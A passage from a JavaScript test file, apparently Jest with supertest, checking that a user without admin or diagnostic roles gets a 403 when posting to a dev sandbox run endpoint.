    });

    it('rejects unauthorized request without admin/diagnostic privileges', async () => {
      const userToken = signAccessToken({
        principal_id: 'test-user-p01',
        email: 'user@hitdna.internal',
        roles: ['user'],
      });

      const res = await request(app)
        .post('/api/dev/sandbox/run')
        .set('Authorization', `Bearer ${userToken}`)
        .send({
          scenarioId: 'SCN-BENIGN-01',
          providerType: 'SIMULATED',
        });

      expect(res.status).toBe(403);
    });
  });
});
